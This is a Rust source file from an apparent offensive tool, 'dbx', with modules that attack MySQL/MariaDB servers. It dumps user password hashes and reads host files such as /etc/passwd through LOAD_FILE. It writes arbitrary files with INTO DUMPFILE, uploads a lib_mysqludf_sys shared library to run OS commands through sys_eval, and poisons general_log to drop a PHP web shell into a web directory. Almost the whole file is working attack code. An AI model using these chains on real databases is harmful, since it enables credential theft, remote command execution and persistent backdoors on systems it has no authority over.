//! MySQL / MariaDB modules: enumeration, file primitives, and RCE chains.
//!
//! dbx contract: check() verifies the primitive WITHOUT mutating state,
//! run() executes it. Red modules leave (or can leave) persistent
//! artifacts and are gated behind --force by the engine.

use async_trait::async_trait;

use dbx_core::{
    AuthError, CheckResult, Module, ModuleMeta, ModuleOpt, ModuleOptions, ModuleResult, Opsec,
};

use crate::{escape_str, grants, has_priv, query_text, MyConn};

// ---------------------------------------------------------------------------
// catalog / factory
// ---------------------------------------------------------------------------

pub(crate) fn catalog() -> Vec<ModuleMeta> {
    vec![
        EnumUsers::meta_def(),
        EnumPrivs::meta_def(),
        EnumVars::meta_def(),
        FileRead::meta_def(),
        FileWrite::meta_def(),
        UdfRce::meta_def(),
        LogRce::meta_def(),
    ]
}

pub(crate) fn instantiate(name: &str, conn: MyConn) -> Result<Box<dyn Module>, AuthError> {
    Ok(match name {
        "enum-users" => Box::new(EnumUsers { conn }),
        "enum-privs" => Box::new(EnumPrivs { conn }),
        "enum-vars" => Box::new(EnumVars { conn }),
        "file-read" => Box::new(FileRead { conn }),
        "file-write" => Box::new(FileWrite { conn }),
        "udf-rce" => Box::new(UdfRce { conn }),
        "log-rce" => Box::new(LogRce { conn }),
        _ => {
            return Err(AuthError::Protocol(format!(
                "unknown MYSQL module '{name}' (-L to list)"
            )))
        }
    })
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

fn req<'a>(opts: &'a ModuleOptions, key: &str) -> Result<&'a str, AuthError> {
    opts.get(key)
        .map(|s| s.as_str())
        .filter(|s| !s.is_empty())
        .ok_or_else(|| {
            AuthError::Protocol(format!(
                "missing required option --{} (see -L)",
                key.to_lowercase().replace('_', "-")
            ))
        })
}

async fn scalar(conn: &MyConn, sql: &str) -> Result<String, AuthError> {
    let rows = query_text(conn, sql).await?;
    rows.into_iter()
        .next()
        .and_then(|r| r.into_iter().next())
        .ok_or_else(|| AuthError::Protocol(format!("no result for: {sql}")))
}

fn to_hex(bytes: &[u8]) -> String {
    use std::fmt::Write;
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        let _ = write!(s, "{b:02x}");
    }
    s
}

/// Identifier whitelist for CREATE FUNCTION names etc.
fn valid_ident(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// secure_file_priv: empty = unrestricted, NULL = file I/O disabled,
/// otherwise a directory prefix. Returns (raw, disabled).
async fn secure_file_priv(conn: &MyConn) -> (String, bool) {
    match scalar(conn, "SELECT @@global.secure_file_priv").await {
        Ok(v) => (v.clone(), v == "NULL"),
        Err(_) => ("unknown".to_string(), false),
    }
}

fn file_priv_ok(grant_lines: &[String]) -> bool {
    has_priv(grant_lines, "ALL PRIVILEGES") || has_priv(grant_lines, "FILE")
}

// ---------------------------------------------------------------------------
// enum-users (Green)
// ---------------------------------------------------------------------------

struct EnumUsers {
    conn: MyConn,
}

impl EnumUsers {
    fn meta_def() -> ModuleMeta {
        ModuleMeta {
            name: "enum-users",
            description: "List accounts from mysql.user with auth plugin and password hash (needs read rights on mysql.user)",
            opsec: Opsec::Green,
            options: &[],
        }
    }
}

#[async_trait]
impl Module for EnumUsers {
    fn meta(&self) -> ModuleMeta {
        Self::meta_def()
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        match query_text(&self.conn, "SELECT user, host FROM mysql.user LIMIT 1").await {
            Ok(_) => Ok(CheckResult {
                possible: true,
                detail: "can read mysql.user".to_string(),
            }),
            Err(e) => Ok(CheckResult {
                possible: false,
                detail: format!("cannot read mysql.user — need privileges ({e})"),
            }),
        }
    }

    async fn run(&self, _opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        // MySQL 5.7+/8 and MariaDB 10.4+ use authentication_string;
        // older MariaDB only has `password`.
        let rows = match query_text(
            &self.conn,
            "SELECT user, host, plugin, authentication_string FROM mysql.user ORDER BY user, host",
        )
        .await
        {
            Ok(r) => r,
            Err(_) => query_text(
                &self.conn,
                "SELECT user, host, plugin, password FROM mysql.user ORDER BY user, host",
            )
            .await
            .map_err(|e| AuthError::Protocol(format!("cannot read mysql.user: {e}")))?,
        };
        let mut lines = vec!["user@host  [plugin]  hash".to_string()];
        for r in rows {
            let u = r.first().cloned().unwrap_or_default();
            let h = r.get(1).cloned().unwrap_or_default();
            let plugin = r.get(2).cloned().unwrap_or_default();
            let hash = r.get(3).cloned().unwrap_or_default();
            let hash = if hash.is_empty() || hash == "NULL" {
                "(no password)".to_string()
            } else {
                hash
            };
            lines.push(format!("{u}@{h}  [{plugin}]  {hash}"));
        }
        Ok(ModuleResult { lines })
    }
}

// ---------------------------------------------------------------------------
// enum-privs (Green)
// ---------------------------------------------------------------------------

struct EnumPrivs {
    conn: MyConn,
}

impl EnumPrivs {
    fn meta_def() -> ModuleMeta {
        ModuleMeta {
            name: "enum-privs",
            description: "SHOW GRANTS for the current user; dangerous privileges (FILE, SUPER, GRANT OPTION) are flagged",
            opsec: Opsec::Green,
            options: &[],
        }
    }
}

#[async_trait]
impl Module for EnumPrivs {
    fn meta(&self) -> ModuleMeta {
        Self::meta_def()
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        Ok(CheckResult {
            possible: true,
            detail: "SHOW GRANTS is always available to the session user".to_string(),
        })
    }

    async fn run(&self, _opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let g = grants(&self.conn).await?;
        let mut lines = Vec::new();
        for line in &g {
            let up = line.to_uppercase();
            let interesting = up.contains("ALL PRIVILEGES")
                || up.contains("FILE")
                || up.contains("SUPER")
                || up.contains("GRANT OPTION");
            if interesting {
                lines.push(format!("{line}   <-- interesting"));
            } else {
                lines.push(line.clone());
            }
        }
        Ok(ModuleResult { lines })
    }
}

// ---------------------------------------------------------------------------
// enum-vars (Green)
// ---------------------------------------------------------------------------

struct EnumVars {
    conn: MyConn,
}

impl EnumVars {
    fn meta_def() -> ModuleMeta {
        ModuleMeta {
            name: "enum-vars",
            description: "Show attack-relevant server variables (version, datadir, plugin_dir, secure_file_priv, log settings)",
            opsec: Opsec::Green,
            options: &[],
        }
    }
}

#[async_trait]
impl Module for EnumVars {
    fn meta(&self) -> ModuleMeta {
        Self::meta_def()
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        Ok(CheckResult {
            possible: true,
            detail: "read-only SHOW VARIABLES".to_string(),
        })
    }

    async fn run(&self, _opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let names = [
            "version",
            "version_comment",
            "hostname",
            "port",
            "datadir",
            "basedir",
            "plugin_dir",
            "secure_file_priv",
            "general_log",
            "general_log_file",
            "slow_query_log",
            "log_error",
            "socket",
            "pid_file",
        ];
        let list = names
            .iter()
            .map(|n| format!("'{n}'"))
            .collect::<Vec<_>>()
            .join(",");
        let rows = query_text(
            &self.conn,
            &format!("SHOW VARIABLES WHERE Variable_name IN ({list})"),
        )
        .await?;
        let mut lines = Vec::new();
        for r in rows {
            let name = r.first().cloned().unwrap_or_default();
            let value = r.get(1).cloned().unwrap_or_else(|| "NULL".to_string());
            let marker = matches!(
                name.as_str(),
                "plugin_dir" | "secure_file_priv" | "general_log" | "general_log_file"
            );
            if marker {
                lines.push(format!("{name} = {value}   <--"));
            } else {
                lines.push(format!("{name} = {value}"));
            }
        }
        Ok(ModuleResult { lines })
    }
}

// ---------------------------------------------------------------------------
// file-read (Green)
// ---------------------------------------------------------------------------

struct FileRead {
    conn: MyConn,
}

impl FileRead {
    fn meta_def() -> ModuleMeta {
        ModuleMeta {
            name: "file-read",
            description: "Read a file off the DB host with LOAD_FILE() (needs FILE privilege; secure_file_priv may restrict paths)",
            opsec: Opsec::Green,
            options: &[ModuleOpt {
                name: "PATH",
                description: "absolute path on the DB host, e.g. /etc/passwd",
                required: true,
            }],
        }
    }
}

#[async_trait]
impl Module for FileRead {
    fn meta(&self) -> ModuleMeta {
        Self::meta_def()
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        let g = grants(&self.conn).await?;
        let can = file_priv_ok(&g);
        let (sfp, disabled) = secure_file_priv(&self.conn).await;
        let possible = can && !disabled;
        let detail = if disabled {
            format!("FILE priv: {can}, but secure_file_priv=NULL disables file I/O entirely")
        } else {
            format!("FILE priv: {can}, secure_file_priv='{sfp}' (empty = unrestricted)")
        };
        Ok(CheckResult { possible, detail })
    }

    async fn run(&self, opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let path = req(opts, "PATH")?;
        let rows = query_text(
            &self.conn,
            &format!("SELECT LOAD_FILE('{}')", escape_str(path)),
        )
        .await?;
        let cell = rows
            .into_iter()
            .next()
            .and_then(|r| r.into_iter().next())
            .unwrap_or_else(|| "NULL".to_string());
        let mut lines = vec![format!("== {path} ==")];
        if cell == "NULL" {
            lines.push(
                "read failed (file missing, not readable by the DB service account, or outside secure_file_priv)"
                    .to_string(),
            );
        } else {
            lines.extend(cell.lines().map(|l| l.to_string()));
        }
        Ok(ModuleResult { lines })
    }
}

// ---------------------------------------------------------------------------
// file-write (Red, --force gated)
// ---------------------------------------------------------------------------

struct FileWrite {
    conn: MyConn,
}

impl FileWrite {
    fn meta_def() -> ModuleMeta {
        ModuleMeta {
            name: "file-write",
            description: "Write arbitrary content to the DB host via SELECT ... INTO DUMPFILE (needs FILE; refuses to overwrite; secure_file_priv may restrict destination)",
            opsec: Opsec::Red,
            options: &[
                ModuleOpt {
                    name: "PATH",
                    description: "destination path on the DB host, e.g. /var/www/html/dbx.php",
                    required: true,
                },
                ModuleOpt {
                    name: "DATA",
                    description: "file content (text; for binary use udf-rce's hex upload path)",
                    required: true,
                },
            ],
        }
    }
}

#[async_trait]
impl Module for FileWrite {
    fn meta(&self) -> ModuleMeta {
        Self::meta_def()
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        let g = grants(&self.conn).await?;
        let can = file_priv_ok(&g);
        let (sfp, disabled) = secure_file_priv(&self.conn).await;
        let possible = can && !disabled;
        let detail = if disabled {
            "secure_file_priv=NULL disables file export entirely".to_string()
        } else {
            format!("FILE priv: {can}, secure_file_priv='{sfp}' (empty = unrestricted; if set, destination must live under that prefix); note: INTO DUMPFILE will NOT overwrite an existing file")
        };
        Ok(CheckResult { possible, detail })
    }

    async fn run(&self, opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let path = req(opts, "PATH")?;
        let data = req(opts, "DATA")?;
        query_text(
            &self.conn,
            &format!(
                "SELECT '{}' INTO DUMPFILE '{}'",
                escape_str(data),
                escape_str(path)
            ),
        )
        .await
        .map_err(|e| {
            let msg = e.to_string();
            if msg.contains("already exists") {
                AuthError::Protocol(format!(
                    "destination exists — INTO DUMPFILE refuses to overwrite: {path}"
                ))
            } else {
                AuthError::Protocol(format!("write failed: {msg}"))
            }
        })?;
        Ok(ModuleResult {
            lines: vec![format!("wrote {} bytes to {path}", data.len())],
        })
    }
}

// ---------------------------------------------------------------------------
// udf-rce (Red, --force gated) — the flagship
// ---------------------------------------------------------------------------

struct UdfRce {
    conn: MyConn,
}

impl UdfRce {
    fn meta_def() -> ModuleMeta {
        ModuleMeta {
            name: "udf-rce",
            description: "UDF command execution: upload a lib_mysqludf_sys-compatible .so into plugin_dir via INTO DUMPFILE, CREATE FUNCTION, then run OS commands as the DB service account (sys_eval returns stdout)",
            opsec: Opsec::Red,
            options: &[
                ModuleOpt {
                    name: "UDF_LIB",
                    description: "path on YOUR machine to lib_mysqludf_sys.so (only needed the first time on a target)",
                    required: false,
                },
                ModuleOpt {
                    name: "CMD",
                    description: "OS command to execute — quick exec: -M udf-rce --cmd 'id'",
                    required: false,
                },
                ModuleOpt {
                    name: "FUNC",
                    description: "function name to create/call; must exist as a symbol in the .so (default sys_eval)",
                    required: false,
                },
            ],
        }
    }

    async fn func_exists(&self, func: &str) -> bool {
        query_text(
            &self.conn,
            &format!(
                "SELECT name FROM mysql.func WHERE name = '{}'",
                escape_str(func)
            ),
        )
        .await
        .map(|r| !r.is_empty())
        .unwrap_or(false)
    }

    fn func_name(opts: &ModuleOptions) -> Result<String, AuthError> {
        let f = opts
            .get("FUNC")
            .filter(|s| !s.is_empty())
            .cloned()
            .unwrap_or_else(|| "sys_eval".to_string());
        if valid_ident(&f) {
            Ok(f)
        } else {
            Err(AuthError::Protocol(format!("invalid function name: {f}")))
        }
    }
}

#[async_trait]
impl Module for UdfRce {
    fn meta(&self) -> ModuleMeta {
        Self::meta_def()
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        if self.func_exists("sys_eval").await {
            return Ok(CheckResult {
                possible: true,
                detail: "UDF function sys_eval() already deployed — pass --cmd to execute"
                    .to_string(),
            });
        }
        let g = grants(&self.conn).await?;
        let can = file_priv_ok(&g);
        let (sfp, disabled) = secure_file_priv(&self.conn).await;
        let plugin_dir = scalar(&self.conn, "SELECT @@global.plugin_dir")
            .await
            .unwrap_or_else(|_| "unknown".to_string());
        let version = scalar(&self.conn, "SELECT @@version")
            .await
            .unwrap_or_else(|_| "unknown".to_string());
        let possible = can && !disabled;
        let detail = if disabled {
            "secure_file_priv=NULL — cannot land the .so anywhere".to_string()
        } else {
            format!(
                "FILE priv: {can}; plugin_dir={plugin_dir}; server={version}; secure_file_priv='{sfp}' — upload lib_mysqludf_sys.so via --udf-lib, then CREATE FUNCTION"
            )
        };
        Ok(CheckResult { possible, detail })
    }

    async fn run(&self, opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let func = Self::func_name(opts)?;
        let mut lines: Vec<String> = Vec::new();

        if !self.func_exists(&func).await {
            // Deploy phase: upload the .so, create the function.
            let lib = req(opts, "UDF_LIB")?;
            let bytes = std::fs::read(lib).map_err(|e| {
                AuthError::Protocol(format!("cannot read UDF library {lib}: {e}"))
            })?;
            let plugin_dir = scalar(&self.conn, "SELECT @@global.plugin_dir").await?;
            let sep = if plugin_dir.ends_with('/') { "" } else { "/" };
            let dest = format!("{plugin_dir}{sep}dbx_udf.so");
            let hex = to_hex(&bytes);
            query_text(
                &self.conn,
                &format!("SELECT 0x{hex} INTO DUMPFILE '{}'", escape_str(&dest)),
            )
            .await
            .map_err(|e| {
                AuthError::Protocol(format!(
                    "UDF upload failed (FILE priv? secure_file_priv? file already there?): {e}"
                ))
            })?;
            lines.push(format!(
                "UDF library uploaded -> {dest} ({} bytes)",
                bytes.len()
            ));
            // sys_eval/sys_get return strings; sys_exec/sys_set return ints.
            let rettype = if func.contains("eval") || func.contains("get") {
                "STRING"
            } else {
                "INTEGER"
            };
            let _ = query_text(&self.conn, &format!("DROP FUNCTION IF EXISTS {func}")).await;
            query_text(
                &self.conn,
                &format!("CREATE FUNCTION {func} RETURNS {rettype} SONAME 'dbx_udf.so'"),
            )
            .await
            .map_err(|e| {
                AuthError::Protocol(format!(
                    "CREATE FUNCTION failed (symbol '{func}' must exist in the .so): {e}"
                ))
            })?;
            lines.push(format!("function {func}() created (RETURNS {rettype})"));
        }

        // Execute phase.
        if let Some(cmd) = opts.get("CMD").filter(|c| !c.is_empty()) {
            let rows = query_text(
                &self.conn,
                &format!("SELECT {func}('{}')", escape_str(cmd)),
            )
            .await?;
            lines.push(format!("$ {cmd}"));
            match rows.into_iter().next().and_then(|r| r.into_iter().next()) {
                Some(out) if out != "NULL" && !out.is_empty() => {
                    lines.extend(out.lines().map(|l| l.to_string()))
                }
                _ => lines.push(
                    "(no output — if this function returns no stdout, redirect to a file and read it back with -M file-read)"
                        .to_string(),
                ),
            }
            if !func.contains("eval") {
                lines.push(format!(
                    "note: {func}() typically returns an exit code, not stdout — use --func sys_eval for output capture"
                ));
            }
        } else if lines.is_empty() {
            lines.push(format!("{func}() ready — pass --cmd to execute commands"));
        } else {
            lines.push("pass --cmd to execute commands via the new function".to_string());
        }

        lines.push(format!(
            "persistence: function {func}() and dbx_udf.so remain on the server (cleanup: DROP FUNCTION {func}; then remove the .so from the OS)"
        ));
        Ok(ModuleResult { lines })
    }
}

// ---------------------------------------------------------------------------
// log-rce (Red, --force gated)
// ---------------------------------------------------------------------------

struct LogRce {
    conn: MyConn,
}

impl LogRce {
    fn meta_def() -> ModuleMeta {
        ModuleMeta {
            name: "log-rce",
            description: "general_log poisoning: aim general_log_file at a web path (or any writable file), SELECT the payload so the server writes it into the log, then restore the original settings",
            opsec: Opsec::Red,
            options: &[
                ModuleOpt {
                    name: "PATH",
                    description: "destination file on the DB host, e.g. /var/www/html/dbx.php",
                    required: true,
                },
                ModuleOpt {
                    name: "DATA",
                    description: "payload line written through the log (default: PHP shell <?php system($_GET[0]); ?>)",
                    required: false,
                },
            ],
        }
    }

    async fn current_settings(&self) -> Result<(String, String), AuthError> {
        let file = scalar(&self.conn, "SELECT @@global.general_log_file").await?;
        let log = scalar(&self.conn, "SELECT @@global.general_log").await?;
        Ok((file, log))
    }
}

const DEFAULT_PHP_SHELL: &str = "<?php system($_GET[0]); ?>";

#[async_trait]
impl Module for LogRce {
    fn meta(&self) -> ModuleMeta {
        Self::meta_def()
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        let g = grants(&self.conn).await?;
        let can = has_priv(&g, "ALL PRIVILEGES")
            || has_priv(&g, "SUPER")
            || has_priv(&g, "SYSTEM_VARIABLES_ADMIN");
        let (file, log) = self
            .current_settings()
            .await
            .unwrap_or_else(|_| ("unknown".to_string(), "unknown".to_string()));
        Ok(CheckResult {
            possible: can,
            detail: format!(
                "needs SET GLOBAL rights ({can}); current general_log={log}, general_log_file={file}"
            ),
        })
    }

    async fn run(&self, opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let path = req(opts, "PATH")?;
        let data = opts
            .get("DATA")
            .filter(|s| !s.is_empty())
            .cloned()
            .unwrap_or_else(|| DEFAULT_PHP_SHELL.to_string());
        let (old_file, old_log) = self.current_settings().await?;

        // Poison, write payload, and ALWAYS try to restore afterwards.
        let res = async {
            query_text(
                &self.conn,
                &format!("SET GLOBAL general_log_file = '{}'", escape_str(path)),
            )
            .await?;
            query_text(&self.conn, "SET GLOBAL general_log = 'ON'").await?;
            query_text(&self.conn, &format!("SELECT '{}'", escape_str(&data))).await?;
            Ok::<(), AuthError>(())
        }
        .await;
        let _ = query_text(
            &self.conn,
            &format!("SET GLOBAL general_log_file = '{}'", escape_str(&old_file)),
        )
        .await;
        let _ = query_text(
            &self.conn,
            &format!("SET GLOBAL general_log = '{}'", escape_str(&old_log)),
        )
        .await;
        res.map_err(|e| AuthError::Protocol(format!("poisoning failed (settings restored): {e}")))?;

        Ok(ModuleResult {
            lines: vec![
                format!("payload landed in {path}"),
                format!("settings restored (general_log={old_log}, file={old_file})"),
            ],
        })
    }
}
